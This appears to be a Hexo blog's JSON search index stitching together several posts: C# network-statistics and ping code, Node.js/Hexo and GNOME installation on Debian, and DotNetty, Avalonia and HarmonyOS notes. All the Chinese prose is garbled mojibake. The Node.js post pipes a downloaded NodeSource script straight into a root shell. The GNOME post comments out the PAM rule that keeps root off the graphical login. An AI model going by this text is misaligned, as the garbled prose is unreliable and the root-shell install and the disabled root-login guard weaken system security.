ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç ï¼Œç”¨äºæ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„ç½‘ç»œä¼ è¾“æ•°æ®é‡ï¼ˆå‘é€å’Œæ¥æ”¶ï¼‰ï¼š 1234567891011121314151617181920212223242526using System;using System.Diagnostics;using System.Net.NetworkInformation; class Program&#123; static void Main() &#123; Process currentProcess = Process.GetCurrentProcess(); Console.WriteLine($&quot;Process ID: &#123;currentProcess.Id&#125;&quot;); IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties(); TcpStatistics tcpStats = ipProperties.GetTcpIPv4Statistics(); Console.WriteLine($&quot;Total bytes received: &#123;tcpStats.BytesReceived&#125;&quot;); Console.WriteLine($&quot;Total bytes sent: &#123;tcpStats.BytesSent&#125;&quot;); // è¾“å‡ºç½‘ç»œæ¥å£ç»Ÿè®¡ä¿¡æ¯ NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces(); foreach (NetworkInterface networkInterface in networkInterfaces) &#123; Console.WriteLine($&quot;Interface: &#123;networkInterface.Name&#125;&quot;); Console.WriteLine($&quot;Bytes received: &#123;networkInterface.GetIPv4Statistics().BytesReceived&#125;&quot;); Console.WriteLine($&quot;Bytes sent: &#123;networkInterface.GetIPv4Statistics().BytesSent&#125;&quot;); &#125; &#125;&#125; è¯·æ³¨æ„ï¼Œè¿™ä¸ªç¤ºä¾‹æ˜¾ç¤ºçš„æ˜¯ä»ç³»ç»Ÿå¯åŠ¨ä»¥æ¥ç´¯è®¡çš„ç½‘ç»œæ¥å£æ•°æ®é‡ã€‚å¦‚æœä½ éœ€è¦ç›‘æµ‹ç‰¹å®šæ—¶é—´æ®µå†…çš„å¸¦å®½ä½¿ç”¨æƒ…å†µï¼Œä½ éœ€è¦å®šæœŸè·å–æ•°æ®å¹¶è®¡ç®—å·®å€¼ã€‚å¦å¤–ï¼Œè¿™ä¸ªç¤ºä¾‹ä»…åŒ…æ‹¬äº†IPv4çš„æ•°æ®ï¼Œå¦‚æœéœ€è¦IPv6æˆ–è€…æ›´å¤šç»†èŠ‚ï¼Œè¯·ç›¸åº”åœ°æ‰©å±•ä»£ç ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"Debian Nodejs HEXO","slug":"Debian-hexo","date":"2024-05-03T09:02:53.000Z","updated":"2024-06-01T02:27:02.000Z","comments":true,"path":"2024/05/03/Debian-hexo/","permalink":"https://banjinmei.github.io/2024/05/03/Debian-hexo/","excerpt":"","text":"Debian Nodejs HEXO å®‰è£…Node.jsç¯å¢ƒ1sudo apt update debianå®‰è£…æœ€æ–°node v20.12.0åœ¨Debianç³»ç»Ÿä¸Šå®‰è£…ç‰¹å®šç‰ˆæœ¬çš„Node.jsï¼ˆä¾‹å¦‚v20.12.0ï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨NodeSourceäºŒè¿›åˆ¶åˆ†å‘ã€‚ä»¥ä¸‹æ˜¯å®‰è£…v20.12.0çš„æ­¥éª¤ï¼š é¦–å…ˆï¼Œæ‰“å¼€ç»ˆç«¯ã€‚ ä½¿ç”¨curlä¸‹è½½NodeSourceçš„å®‰è£…è„šæœ¬ï¼š 1curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - å®‰è£…Node.jsï¼š 1sudo apt-get install -y nodejs éªŒè¯Node.jsæ˜¯å¦å®‰è£…æˆåŠŸï¼š 1node --version å¦‚æœä½ æƒ³è¦ç¡®ä¿å®‰è£…äº†ç‰¹å®šçš„v20.12.0ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨å®‰è£…å®ŒNode.jsåè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯ç‰ˆæœ¬ï¼š 1node -v å¦‚æœæ˜¾ç¤ºçš„ç‰ˆæœ¬å·æ˜¯v20.12.0ï¼Œåˆ™è¡¨ç¤ºå·²ç»æˆåŠŸå®‰è£…äº†è¯¥ç‰ˆæœ¬ã€‚ å®‰è£…HEXOä½¿ç”¨npmåŒ…ç®¡ç†å™¨ï¼Œç›´æ¥å®‰è£…hexo 1npm install hexo -g 1hexo init blog 1cd blog 1npm install 1hexo server hexo ä¿®æ”¹ç«¯å£å·_config.yml # æˆ–è€…ä½¿ç”¨ vim _config.yml Docs: https://hexo.io/docs/server.html1234server: port: 12311 # ä¿®æ”¹è¿™é‡Œä¸ºä½ æƒ³è¦çš„ç«¯å£å· compress: true header: true 1hexo s","categories":[],"tags":[]},{"title":".NET netty proto","slug":"NET-netty-proto","date":"2024-05-02T18:09:32.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/05/03/NET-netty-proto/","permalink":"https://banjinmei.github.io/2024/05/03/NET-netty-proto/","excerpt":"","text":"DotNettyæ˜¯å¾®è½¯çš„Azureå›¢é˜Ÿï¼Œä½¿ç”¨C#å®ç°çš„Nettyçš„ç‰ˆæœ¬å‘å¸ƒã€‚ä¸ä½†ä½¿ç”¨äº†C#å’Œ.Netå¹³å°çš„æŠ€æœ¯ç‰¹ç‚¹ï¼Œå¹¶ä¸”ä¿ç•™äº†NettyåŸæ¥ç»å¤§éƒ¨åˆ†çš„ç¼–ç¨‹æ¥å£ã€‚è®©æˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶ï¼Œå®Œå…¨å¯ä»¥ä¾ç…§Nettyå®˜æ–¹çš„æ•™ç¨‹æ¥å­¦ä¹ å’Œä½¿ç”¨DotNettyåº”ç”¨ç¨‹åºã€‚ Netty æ˜¯ä¸€ä¸ªå¼‚æ­¥äº‹ä»¶é©±åŠ¨çš„ç½‘ç»œåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘å¯ç»´æŠ¤çš„é«˜æ€§èƒ½åè®®æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ã€‚ ä¼˜ç‚¹å…³æ³¨ç‚¹åˆ†ç¦»â€”â€”ä¸šåŠ¡å’Œç½‘ç»œé€»è¾‘è§£è€¦ï¼›æ¨¡å—åŒ–å’Œå¯å¤ç”¨æ€§ï¼›å¯æµ‹è¯•æ€§ä½œä¸ºé¦–è¦çš„è¦æ±‚å†å²é˜»å¡Socketé€šä¿¡ç‰¹ç‚¹ï¼š å»ºç«‹è¿æ¥è¦é˜»å¡çº¿ç¨‹ï¼Œè¯»å–æ•°æ®è¦é˜»å¡çº¿ç¨‹å¦‚æœè¦ç®¡ç†å¤šä¸ªå®¢æˆ·ç«¯ï¼Œå°±éœ€è¦ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯å»ºç«‹ä¸åŒçš„çº¿ç¨‹ä¼šæœ‰å¤§é‡çš„çº¿ç¨‹åœ¨ä¼‘çœ çŠ¶æ€ï¼Œç­‰å¾…æ¥æ”¶æ•°æ®ï¼Œèµ„æºæµªè´¹æ¯ä¸ªçº¿ç¨‹éƒ½è¦å ç”¨ç³»ç»Ÿèµ„æºçº¿ç¨‹çš„åˆ‡æ¢å¾ˆè€—è´¹ç³»ç»Ÿèµ„æºéé˜»å¡Socketï¼ˆNIOï¼‰ç‰¹ç‚¹ï¼šæ¯ä¸ªSocketå¦‚æœéœ€è¦è¯»å†™æ“ä½œï¼Œéƒ½é€šè¿‡äº‹ä»¶é€šçŸ¥çš„æ–¹å¼é€šçŸ¥é€‰æ‹©å™¨ï¼Œè¿™æ ·å°±å®ç°äº†ä¸€ä¸ªçº¿ç¨‹ç®¡ç†å¤šä¸ªSocketçš„ç›®çš„ã€‚â€‹ é€‰æ‹©å™¨ç”šè‡³å¯ä»¥åœ¨æ‰€æœ‰çš„Socketç©ºé—²çš„æ—¶å€™å…è®¸çº¿ç¨‹å…ˆå»å¹²åˆ«çš„äº‹æƒ…å‡å°‘äº†çº¿ç¨‹æ•°é‡å¯¼è‡´çš„èµ„æºå ç”¨ï¼Œå‡å°‘äº†çº¿ç¨‹åˆ‡æ¢å¯¼è‡´çš„èµ„æºæ¶ˆè€— Protobufwakeng","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET æ£€æµ‹åœ°å€/ä¸»æœº/åŸŸåæ˜¯å¦æ­£å¸¸","slug":"NET-IP-Host","date":"2024-04-28T11:09:40.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/28/NET-IP-Host/","permalink":"https://banjinmei.github.io/2024/04/28/NET-IP-Host/","excerpt":"","text":"ğŸŒ±PING åœ°å€&#x2F;ä¸»æœºå&#x2F;åŸŸå 12345678910111213141516171819202122232425/// &lt;summary&gt;/// PING/// &lt;/summary&gt;/// &lt;param name=&quot;ip&quot;&gt;ip&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static bool PingIp(string ip)&#123; System.Net.NetworkInformation.Ping p = new System.Net.NetworkInformation.Ping(); System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions(); options.DontFragment = true; string data = &quot;Test Data!&quot;; byte[] buffer = Encoding.ASCII.GetBytes(data); int timeout = 2000; // Timeout System.Net.NetworkInformation.PingReply reply = p.Send(ip, timeout, buffer, options); if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) &#123; // AddToConvo(ip + reply.Status); return true; &#125; else &#123; // AddToConvo(ip + reply.Status); return false; &#125;&#125; ğŸ‘€è°ƒç”¨æ–¹æ³• 123456789101112List&lt;string&gt; list = new List&lt;string&gt;();list.Add(&quot;192.168.1.1&quot;);list.Add(&quot;192.168.3.1&quot;);list.Add(&quot;192.168.4.1&quot;);foreach (string s in list)&#123; Console.WriteLine(s+&quot; &quot;+ ccPing.PingIp(s)); //if(!xxx) &#125;Thread.Sleep(10000); â€‹ éš”10ç§’è‡ªåŠ¨è°ƒç”¨1æ¬¡ ğŸ“«æ£€æŸ¥URL 12345678910111213141516171819202122public async Task&lt;bool&gt; IsServerRespondingAsync(string url, TimeSpan timeout)&#123; try &#123; using (var cancellationTokenSource = new System.Threading.CancellationTokenSource()) &#123; cancellationTokenSource.CancelAfter(timeout); var response = await _httpClient.GetAsync(url, cancellationTokenSource.Token); return response.IsSuccessStatusCode; &#125; &#125; catch (TaskCanceledException) &#123; // è¯·æ±‚è¶…æ—¶ return false; &#125; catch (Exception) &#123; // å‘ç”Ÿå…¶ä»–é”™è¯¯ return false; &#125;&#125; âš¡å¼‚æ­¥è°ƒç”¨ 1await checker.IsServerRespondingAsync(url, TimeSpan.FromSeconds(2)); å¦‚æœFalseå¯ä»¥è°ƒç”¨æŠ¥è­¦ä»£ç  END â€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"spider","slug":"spider","permalink":"https://banjinmei.github.io/tags/spider/"}],"author":"mu"},{"title":".NET Avalonia Linux ","slug":"NET-Avalonia","date":"2024-04-26T16:07:15.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/27/NET-Avalonia/","permalink":"https://banjinmei.github.io/2024/04/27/NET-Avalonia/","excerpt":"","text":"ç¯å¢ƒWIN10 VS2022 debian ğŸ‘»å‰è¨€Avalonia æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºè·¨å¹³å°ç”¨æˆ·ç•Œé¢ (UI) çš„å¼€æºæ¡†æ¶ã€‚å®ƒæ˜¯ä¸€ä¸ªåŸºäº .NET å¹³å°çš„æ¡†æ¶ï¼Œå…è®¸å¼€å‘è€…ä½¿ç”¨ XAML å’Œ C#ï¼ˆF#ï¼‰æ¥æ„å»ºè·¨å¹³å°çš„åº”ç”¨ç¨‹åºã€‚Avalonia çš„ç›®æ ‡æ˜¯æä¾›ä¸ Windows Presentation Foundation (WPF) ç±»ä¼¼çš„å¼€å‘ä½“éªŒï¼Œä½†èƒ½å¤Ÿåœ¨ Windowsã€macOS å’Œ Linux ç­‰å¤šä¸ªå¹³å°ä¸Šè¿è¡Œã€‚ ä½¿ç”¨ Avaloniaï¼Œå¼€å‘è€…å¯ä»¥åˆ›å»ºå„ç§ç±»å‹çš„åº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬æ¡Œé¢åº”ç”¨ã€ç§»åŠ¨åº”ç”¨å’ŒåµŒå…¥å¼åº”ç”¨ã€‚ä¸€äº›å¯ä»¥é€šè¿‡ Avalonia å®ç°çš„åŠŸèƒ½å’Œåº”ç”¨åŒ…æ‹¬ï¼š æ¡Œé¢åº”ç”¨ç¨‹åºï¼šå¦‚åŠå…¬è½¯ä»¶ã€IDEã€æ¸¸æˆå®¢æˆ·ç«¯ç­‰ã€‚ ç§»åŠ¨åº”ç”¨ç¨‹åºï¼šé€šè¿‡ Avalonia å¯ä»¥æ„å»ºæ”¯æŒå¤šä¸ªå¹³å°çš„ç§»åŠ¨åº”ç”¨ï¼Œå¦‚ Windowsã€macOS å’Œ Linux ä¸Šçš„ç§»åŠ¨åº”ç”¨ã€‚ è·¨å¹³å°å·¥å…·ï¼šAvalonia å¯ä»¥ç”¨äºæ„å»ºè·¨å¹³å°çš„å¼€å‘å·¥å…·ã€å®ç”¨å·¥å…·ç­‰ã€‚ æ¸¸æˆå¼€å‘ï¼šAvalonia ä¹Ÿå¯ä»¥ç”¨äºæ„å»ºæ¸¸æˆçš„ç”¨æˆ·ç•Œé¢ï¼Œé€‚åˆåŸºäº .NET å¹³å°çš„æ¸¸æˆå¼€å‘ã€‚ Avalonia æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·é›†ï¼Œä½¿å¼€å‘è€…èƒ½å¤Ÿåˆ›å»ºå…·æœ‰å„ç§åŠŸèƒ½å’Œæ ·å¼çš„è·¨å¹³å°åº”ç”¨ç¨‹åºã€‚ ğŸ’»å®‰è£…Avaloniaé€‰æ‹©ç®¡ç†æ‹“å±•ï¼Œç‚¹å‡»ä¸‹è½½ï¼Œå®‰è£… â€‹ â€‹ ğŸ“¦åˆ›å»ºé¡¹ç›®â€‹ â€‹ â€‹ ç¼–ç â€¦ ğŸ“šåœ¨winä¸‹è¿è¡Œâ€‹ æŸ¥çœ‹linuxå†…æ ¸ uname -a â€‹ ğŸ”‘æ‰“åŒ…å‘å¸ƒå¤åˆ¶åˆ°linux æˆäºˆæƒé™ ğŸ“»åœ¨linuxä¸‹è¿è¡Œè¿ç§»Socketå‘å¸ƒåˆ°linuxâ€‹ â€‹ å®ç°win linux web åŸºäºsocketå®æ—¶èŠå¤©","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Avalonia","slug":"Avalonia","permalink":"https://banjinmei.github.io/tags/Avalonia/"}],"author":"mu"},{"title":"Debian Gnome-Desktop GUI ","slug":"Debian-Gnome-Desktop-GUI","date":"2024-04-26T15:19:27.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/26/Debian-Gnome-Desktop-GUI/","permalink":"https://banjinmei.github.io/2024/04/26/Debian-Gnome-Desktop-GUI/","excerpt":"","text":"debian gnome-desktop ğŸŒæ›´æ–°1234sudo apt update[2024042601]sudo apt -y upgrade â€‹ ğŸ¨å®‰è£…1sudo apt -y install task-gnome-desktop è¿™ä¸ªè¿‡ç¨‹æ¯”è¾ƒä¹… â€‹ ğŸåˆ†é…123456sudo systemctl set-default graphical.targetvi /etc/pam.d/gdm-password``` bashæ³¨é‡Š auth required pam_succeed_if.so user != root quiet_success``` bash#auth required pam_succeed_if.so user != root quiet_success ğŸ›‹ï¸é‡å¯1sudo reboot ğŸ”‘é€šè¿‡VNCè¿æ¥â€‹ é…ç½®å â€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"HarmonyOSå¼€å‘ç¯å¢ƒæ­å»º ç§»åŠ¨å¼€å‘ é¸¿è’™å¼€å‘ ArkTS","slug":"HarmonyOS-Base","date":"2024-04-21T05:00:43.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/21/HarmonyOS-Base/","permalink":"https://banjinmei.github.io/2024/04/21/HarmonyOS-Base/","excerpt":"","text":"ğŸ’¡ ç¯å¢ƒæ­å»ºHarmonyOSå¼€å‘ç¯å¢ƒæ­å»º DevEco Studioå®‰è£…https://developer.huawei.com/consumer/cn/deveco-studio/ â€‹ ğŸš€å®‰è£…nodejsâ€‹ ğŸ¤µå®‰è£…ohpmâ€‹ ğŸ”å®‰è£…SDKâ€‹ â€‹ ğŸ’¥Emulatorå®‰è£…â€‹ Q:The graphic card OpenGL version is too old for Previewer to work.. è§£å†³æ–¹æ³•åˆ†ä¸¤æ­¥ï¼š 1ã€ä¸‹è½½enGLåº“ï¼šhttps://github.com/pal1000/mesa-dist-win/releases/download/23.1.1/mesa3d-23.1.1-release-msvc.7z 2ã€è§£å‹ä¸‹è½½çš„zipæ–‡ä»¶,åŒå‡»æ‰§è¡Œsystemwidedeploy.cmdæ–‡ä»¶ï¼Œç„¶åæŒ‰ä»»æ„é”®ï¼Œå‡ºç°ä¸€ä¸ªèœå•ï¼Œé€‰æ‹©1ï¼Œç„¶åå¼€å§‹å®‰è£…OpenGLé©±åŠ¨ï¼Œå‡ºç°complete åå…³é—­ç»ˆç«¯ï¼Œé‡æ–°è¿è¡Œç¨‹åºå³å¯ç”Ÿæ•ˆã€‚ ğŸŒ¶ï¸æ–°å»ºArkTsé¡¹ç›®â€‹ â€‹ â€‹ entryï¼šHarmonyOSå·¥ç¨‹æ¨¡å—ï¼Œç¼–è¯‘æ„å»ºç”Ÿæˆä¸€ä¸ªHAPåŒ…ã€‚ src &gt; main &gt; etsï¼šç”¨äºå­˜æ”¾etsæºç ã€‚src &gt; main &gt; ets &gt; MainAbilityï¼šåº”ç”¨&#x2F;æœåŠ¡çš„å…¥å£ã€‚src &gt; main &gt; ets &gt; MainAbility &gt; pagesï¼šMainAbilityåŒ…å«çš„é¡µé¢ã€‚src &gt; main &gt; ets &gt; MainAbility &gt; pages &gt; index.etsï¼špagesåˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªé¡µé¢ï¼Œå³åº”ç”¨çš„é¦–é¡µå…¥å£ã€‚src &gt; main &gt; ets &gt; MainAbility &gt; app.etsï¼šæ‰¿è½½Abilityç”Ÿå‘½å‘¨æœŸã€‚src &gt; main &gt; resourcesï¼šç”¨äºå­˜æ”¾åº”ç”¨&#x2F;æœåŠ¡æ‰€ç”¨åˆ°çš„èµ„æºæ–‡ä»¶ï¼Œå¦‚å›¾å½¢ã€å¤šåª’ä½“ã€å­—ç¬¦ä¸²ã€å¸ƒå±€æ–‡ä»¶ç­‰ã€‚src &gt; main &gt; config.jsonï¼šæ¨¡å—é…ç½®æ–‡ä»¶ã€‚ä¸»è¦åŒ…å«HAPåŒ…çš„é…ç½®ä¿¡æ¯ã€åº”ç”¨&#x2F;æœåŠ¡åœ¨å…·ä½“è®¾å¤‡ä¸Šçš„é…ç½®ä¿¡æ¯ä»¥åŠåº”ç”¨&#x2F;æœåŠ¡çš„å…¨å±€é…ç½®ä¿¡æ¯ã€‚build-profile.json5ï¼šå½“å‰çš„æ¨¡å—ä¿¡æ¯ã€ç¼–è¯‘ä¿¡æ¯é…ç½®é¡¹ï¼ŒåŒ…æ‹¬buildOptionã€targetsé…ç½®ç­‰ã€‚å…¶ä¸­targetsä¸­å¯é…ç½®å½“å‰è¿è¡Œç¯å¢ƒï¼Œé»˜è®¤ä¸ºHarmonyOSã€‚hvigorfile.tsï¼šæ¨¡å—çº§ç¼–è¯‘æ„å»ºä»»åŠ¡è„šæœ¬ï¼Œå¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰ç›¸å…³ä»»åŠ¡å’Œä»£ç å®ç°ã€‚build-profile.json5ï¼šåº”ç”¨çº§é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç­¾åã€äº§å“é…ç½®ç­‰ã€‚ hvigorfile.tsï¼šåº”ç”¨çº§ç¼–è¯‘æ„å»ºä»»åŠ¡è„šæœ¬ã€‚ â€‹ ğŸ†ï¸ArkTSè¯­è¨€ArkTSæ˜¯HarmonyOSä¼˜é€‰çš„ä¸»åŠ›åº”ç”¨å¼€å‘è¯­è¨€ã€‚ ArkTSå›´ç»•åº”ç”¨å¼€å‘åœ¨TypeScriptï¼ˆç®€ç§°TSï¼‰ç”Ÿæ€åŸºç¡€ä¸Šåšäº†è¿›ä¸€æ­¥æ‰©å±•ï¼Œç»§æ‰¿äº†TSçš„æ‰€æœ‰ç‰¹æ€§ï¼Œæ˜¯TSçš„è¶…é›†ã€‚å› æ­¤ï¼Œåœ¨å­¦ä¹ ArkTSè¯­è¨€ä¹‹å‰ï¼Œå»ºè®®å¼€å‘è€…å…·å¤‡TSè¯­è¨€å¼€å‘èƒ½åŠ›ã€‚ åŸºæœ¬è¯­æ³•ï¼šArkTSå®šä¹‰äº†å£°æ˜å¼UIæè¿°ã€è‡ªå®šä¹‰ç»„ä»¶å’ŒåŠ¨æ€æ‰©å±•UIå…ƒç´ çš„èƒ½åŠ›ï¼Œå†é…åˆArkUIå¼€å‘æ¡†æ¶ä¸­çš„ç³»ç»Ÿç»„ä»¶åŠå…¶ç›¸å…³çš„äº‹ä»¶æ–¹æ³•ã€å±æ€§æ–¹æ³•ç­‰å…±åŒæ„æˆäº†UIå¼€å‘çš„ä¸»ä½“ã€‚çŠ¶æ€ç®¡ç†ï¼šArkTSæä¾›äº†å¤šç»´åº¦çš„çŠ¶æ€ç®¡ç†æœºåˆ¶ã€‚åœ¨UIå¼€å‘æ¡†æ¶ä¸­ï¼Œä¸UIç›¸å…³è”çš„æ•°æ®å¯ä»¥åœ¨ç»„ä»¶å†…ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒç»„ä»¶å±‚çº§é—´ä¼ é€’ï¼Œæ¯”å¦‚çˆ¶å­ç»„ä»¶ä¹‹é—´ã€çˆ·å­™ç»„ä»¶ä¹‹é—´ï¼Œè¿˜å¯ä»¥åœ¨åº”ç”¨å…¨å±€èŒƒå›´å†…ä¼ é€’æˆ–è·¨è®¾å¤‡ä¼ é€’ã€‚å¦å¤–ï¼Œä»æ•°æ®çš„ä¼ é€’å½¢å¼æ¥çœ‹ï¼Œå¯åˆ†ä¸ºåªè¯»çš„å•å‘ä¼ é€’å’Œå¯å˜æ›´çš„åŒå‘ä¼ é€’ã€‚å¼€å‘è€…å¯ä»¥çµæ´»åœ°åˆ©ç”¨è¿™äº›èƒ½åŠ›æ¥å®ç°æ•°æ®å’ŒUIçš„è”åŠ¨ã€‚æ¸²æŸ“æ§åˆ¶ï¼šArkTSæä¾›äº†æ¸²æŸ“æ§åˆ¶çš„èƒ½åŠ›ã€‚æ¡ä»¶æ¸²æŸ“å¯æ ¹æ®åº”ç”¨çš„ä¸åŒçŠ¶æ€ï¼Œæ¸²æŸ“å¯¹åº”çŠ¶æ€ä¸‹çš„UIå†…å®¹ã€‚å¾ªç¯æ¸²æŸ“å¯ä»æ•°æ®æºä¸­è¿­ä»£è·å–æ•°æ®ï¼Œå¹¶åœ¨æ¯æ¬¡è¿­ä»£è¿‡ç¨‹ä¸­åˆ›å»ºç›¸åº”çš„ç»„ä»¶ã€‚æ•°æ®æ‡’åŠ è½½ä»æ•°æ®æºä¸­æŒ‰éœ€è¿­ä»£æ•°æ®ï¼Œå¹¶åœ¨æ¯æ¬¡è¿­ä»£è¿‡ç¨‹ä¸­åˆ›å»ºç›¸åº”çš„ç»„ä»¶ã€‚æœªæ¥ï¼ŒArkTSä¼šç»“åˆåº”ç”¨å¼€å‘&#x2F;è¿è¡Œçš„éœ€æ±‚æŒç»­æ¼”è¿›ï¼Œé€æ­¥æä¾›å¹¶è¡Œå’Œå¹¶å‘èƒ½åŠ›å¢å¼ºã€ç³»ç»Ÿç±»å‹å¢å¼ºã€åˆ†å¸ƒå¼å¼€å‘èŒƒå¼ç­‰æ›´å¤šç‰¹æ€§ã€‚ âœ¨ï¸åŸºæœ¬è¯­æ³•åŸºæœ¬è¯­æ³•æ¦‚è¿°åœ¨åˆæ­¥äº†è§£äº†ArkTSè¯­è¨€ä¹‹åï¼Œæˆ‘ä»¬ä»¥ä¸€ä¸ªå…·ä½“çš„ç¤ºä¾‹æ¥è¯´æ˜ArkTSçš„åŸºæœ¬ç»„æˆã€‚è£…é¥°å™¨ï¼š ç”¨äºè£…é¥°ç±»ã€ç»“æ„ã€æ–¹æ³•ä»¥åŠå˜é‡ï¼Œå¹¶èµ‹äºˆå…¶ç‰¹æ®Šçš„å«ä¹‰ã€‚å¦‚ä¸Šè¿°ç¤ºä¾‹ä¸­@Entryã€@Componentå’Œ@Stateéƒ½æ˜¯è£…é¥°å™¨ï¼Œ@Componentè¡¨ç¤ºè‡ªå®šä¹‰ç»„ä»¶ï¼Œ@Entryè¡¨ç¤ºè¯¥è‡ªå®šä¹‰ç»„ä»¶ä¸ºå…¥å£ç»„ä»¶ï¼Œ@Stateè¡¨ç¤ºç»„ä»¶ä¸­çš„çŠ¶æ€å˜é‡ï¼ŒçŠ¶æ€å˜é‡å˜åŒ–ä¼šè§¦å‘UIåˆ·æ–°ã€‚UIæè¿°ï¼šä»¥å£°æ˜å¼çš„æ–¹å¼æ¥æè¿°UIçš„ç»“æ„ï¼Œä¾‹å¦‚build()æ–¹æ³•ä¸­çš„ä»£ç å—ã€‚è‡ªå®šä¹‰ç»„ä»¶ï¼šå¯å¤ç”¨çš„UIå•å…ƒï¼Œå¯ç»„åˆå…¶ä»–ç»„ä»¶ï¼Œå¦‚ä¸Šè¿°è¢«@Componentè£…é¥°çš„struct Helloã€‚ç³»ç»Ÿç»„ä»¶ï¼šArkUIæ¡†æ¶ä¸­é»˜è®¤å†…ç½®çš„åŸºç¡€å’Œå®¹å™¨ç»„ä»¶ï¼Œå¯ç›´æ¥è¢«å¼€å‘è€…è°ƒç”¨ï¼Œæ¯”å¦‚ç¤ºä¾‹ä¸­çš„Columnã€Textã€Dividerã€Buttonã€‚å±æ€§æ–¹æ³•ï¼šç»„ä»¶å¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨é…ç½®å¤šé¡¹å±æ€§ï¼Œå¦‚fontSize()ã€width()ã€height()ã€backgroundColor()ç­‰ã€‚äº‹ä»¶æ–¹æ³•ï¼šç»„ä»¶å¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨è®¾ç½®å¤šä¸ªäº‹ä»¶çš„å“åº”é€»è¾‘ï¼Œå¦‚è·Ÿéšåœ¨Buttonåé¢çš„onClick()ã€‚ç³»ç»Ÿç»„ä»¶ã€å±æ€§æ–¹æ³•ã€äº‹ä»¶æ–¹æ³•å…·ä½“ä½¿ç”¨å¯å‚è€ƒåŸºäºArkTSçš„å£°æ˜å¼å¼€å‘èŒƒå¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒArkTSæ‰©å±•äº†å¤šç§è¯­æ³•èŒƒå¼æ¥ä½¿å¼€å‘æ›´åŠ ä¾¿æ·ï¼š @Builder&#x2F;@BuilderParamï¼šç‰¹æ®Šçš„å°è£…UIæè¿°çš„æ–¹æ³•ï¼Œç»†ç²’åº¦çš„å°è£…å’Œå¤ç”¨UIæè¿°ã€‚@Extend&#x2F;@Stylesï¼šæ‰©å±•å†…ç½®ç»„ä»¶å’Œå°è£…å±æ€§æ ·å¼ï¼Œæ›´çµæ´»åœ°ç»„åˆå†…ç½®ç»„ä»¶ã€‚stateStylesï¼šå¤šæ€æ ·å¼ï¼Œå¯ä»¥ä¾æ®ç»„ä»¶çš„å†…éƒ¨çŠ¶æ€çš„ä¸åŒï¼Œè®¾ç½®ä¸åŒæ ·å¼ã€‚ ğŸ¥‡ å£°æ˜å¼UIæè¿°ArkTSä»¥å£°æ˜æ–¹å¼ç»„åˆå’Œæ‰©å±•ç»„ä»¶æ¥æè¿°åº”ç”¨ç¨‹åºçš„UIï¼ŒåŒæ—¶è¿˜æä¾›äº†åŸºæœ¬çš„å±æ€§ã€äº‹ä»¶å’Œå­ç»„ä»¶é…ç½®æ–¹æ³•ï¼Œå¸®åŠ©æˆ‘ä»¬å®ç°åº”ç”¨äº¤äº’é€»è¾‘ã€‚åˆ›å»ºç»„ä»¶æ ¹æ®ç»„ä»¶æ„é€ æ–¹æ³•çš„ä¸åŒï¼Œåˆ›å»ºç»„ä»¶åŒ…å«æœ‰å‚æ•°å’Œæ— å‚æ•°ä¸¤ç§æ–¹å¼ã€‚æ— å‚æ•°å¦‚æœç»„ä»¶çš„æ¥å£å®šä¹‰æ²¡æœ‰åŒ…å«å¿…é€‰æ„é€ å‚æ•°ï¼Œåˆ™ç»„ä»¶åé¢çš„â€œ()â€ä¸éœ€è¦é…ç½®ä»»ä½•å†…å®¹ã€‚ä¾‹å¦‚ï¼ŒDividerç»„ä»¶ä¸åŒ…å«æ„é€ å‚æ•° 12345Column() &#123; Text(&#x27;item 1&#x27;) Divider() Text(&#x27;item 